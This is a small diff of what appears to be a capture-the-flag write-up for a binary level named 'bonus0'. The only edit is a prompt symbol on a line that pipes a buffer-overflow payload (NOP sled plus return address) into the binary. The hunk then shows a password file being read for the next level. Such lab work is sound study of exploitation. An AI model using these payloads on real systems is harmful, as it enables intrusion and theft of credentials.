@@ -203,7 +203,7 @@ int main(int argc, char **argv)
 
 :~/ cd ~
 
-:~/ (python -c 'print "\x90" * 4095 + "\n" + "\x90" * 9 + "\x6a\xff\xff\xbf" + "\x90" * 50'; cat) | ./bonus0
+:~$ (python -c 'print "\x90" * 4095 + "\n" + "\x90" * 9 + "\x6a\xff\xff\xbf" + "\x90" * 50'; cat) | ./bonus0
 
 > cat /home/user/bonus1/.pass
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
